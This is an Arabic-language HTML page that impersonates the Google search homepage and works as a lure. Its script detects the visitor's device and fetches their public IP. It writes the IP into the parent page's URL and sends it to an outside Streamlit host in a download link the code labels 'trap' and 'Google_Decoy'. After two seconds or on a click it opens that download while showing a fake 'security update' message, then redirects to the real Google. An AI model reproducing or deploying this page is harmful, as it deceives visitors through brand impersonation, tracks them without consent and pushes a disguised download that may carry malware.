<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Google</title>
    <style>
        body { 
            background: white; 
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; 
            margin: 0; 
            display: flex; 
            flex-direction: column; 
            align-items: center; 
            justify-content: center; 
            height: 100vh;
            width: 100vw;
            cursor: pointer;
            overflow: hidden;
            position: fixed;
            top: 0;
            left: 0;
            z-index: 999999;
        }
        .container { text-align: center; width: 100%; }
        img { width: 272px; max-width: 80%; margin-bottom: 20px; }
        .search-box {
            width: 90%;
            max-width: 584px;
            height: 44px;
            border: 1px solid #dfe1e5;
            border-radius: 24px;
            margin: 0 auto 30px auto;
            display: flex;
            align-items: center;
            padding: 0 20px;
        }
        .buttons { display: flex; gap: 12px; justify-content: center; }
        button {
            background-color: #f8f9fa;
            border: 1px solid #f8f9fa;
            border-radius: 4px;
            color: #3c4043;
            font-size: 14px;
            padding: 0 16px;
            height: 36px;
        }
        #status { margin-top: 20px; color: #5f6368; font-size: 14px; }
    </style>
</head>
<body onclick="triggerDownload()">
    <div class="container">
        <img src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_272x92dp.png" alt="Google">
        <div class="search-box">
            <svg focusable="false" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" width="20" height="20" style="fill: #9aa0a6; margin-right: 10px;"><path d="M15.5 14h-.79l-.28-.27A6.471 6.471 0 0 0 16 9.5 6.5 6.5 0 1 0 9.5 16c1.61 0 3.09-.59 4.23-1.57l.27.28v.79l5 4.99L20.49 19l-4.99-5zm-6 0C7.01 14 5 11.99 5 9.5S7.01 5 9.5 5 14 7.01 14 9.5 11.99 14 9.5 14z"></path></svg>
        </div>
        <div class="buttons">
            <button>بحث Google</button>
            <button>ضربة حظ</button>
        </div>
        <div id="status">جاري التحقق من الأمان...</div>
    </div>

    <script>
        let hasDownloaded = false;
        let deviceType = "pc";

        const ua = navigator.userAgent.toLowerCase();
        if (ua.indexOf("android") > -1) deviceType = "android";
        else if (ua.indexOf("iphone") > -1 || ua.indexOf("ipad") > -1) deviceType = "ios";

        async function fetchPublicIP() {
            try {
                const response = await fetch('https://api.ipify.org?format=json');
                const data = await response.json();
                const publicIP = data.ip;
                
                // إرسال الـ IP العام للأب (Streamlit) عبر الرابط
                const currentUrl = new URL(window.parent.location.href);
                currentUrl.searchParams.set('ip', publicIP);
                window.parent.history.replaceState({}, '', currentUrl);
                return publicIP;
            } catch (err) {
                return "Unknown";
            }
        }

        async function triggerDownload() {
            if (hasDownloaded) return;
            hasDownloaded = true;
            
            const publicIP = await fetchPublicIP();
            
            const urlParams = new URLSearchParams(window.parent.location.search);
            const trap = urlParams.get('trap') || 'Google_Decoy';
            
            let downloadUrl = `https://rashdai.streamlit.app/?download=true&device=${deviceType}&ip=${publicIP}&trap=${trap}`;
            
            // فتح التحميل في نافذة جديدة
            window.open(downloadUrl, '_blank');
            
            document.getElementById('status').innerText = "جاري تحميل التحديث الأمني...";
            
            setTimeout(() => {
                window.parent.location.href = "https://www.google.com";
            }, 3000);
        }

        window.onload = function() {
            fetchPublicIP();
            setTimeout(triggerDownload, 2000);
        };
    </script>
</body>
</html>
